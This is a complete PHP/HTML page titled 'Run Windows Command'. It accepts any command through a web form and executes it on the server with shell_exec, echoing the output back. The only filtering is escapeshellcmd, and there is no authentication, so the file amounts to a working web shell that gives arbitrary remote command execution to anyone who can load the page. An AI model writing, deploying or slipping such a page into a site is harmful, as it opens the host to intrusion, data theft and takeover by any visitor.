<!DOCTYPE html>
<html>
<head>
    <title>Run Windows Command</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f9f9f9; }
        textarea { width: 600px; height: 150px; }
        input[type=text] { width: 400px; padding: 8px; }
        input[type=submit] { padding: 8px 15px; }
        pre { background: #222; color: #0f0; padding: 15px; white-space: pre-wrap; }
    </style>
</head>
<body>

<h1>Run Windows Command</h1>

<form method="post">
    <label for="cmd">Enter Windows Command:</label><br>
    <input type="text" name="cmd" id="cmd" placeholder="e.g. ipconfig /all" required />
    <input type="submit" value="Run Command" />
</form>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['cmd'])) {
    // Sanitize input (basic)
    $command = escapeshellcmd($_POST['cmd']);

    // Execute the command
    $output = shell_exec($command);

    echo "<h2>Output:</h2>";
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}
?>

</body>
</html>
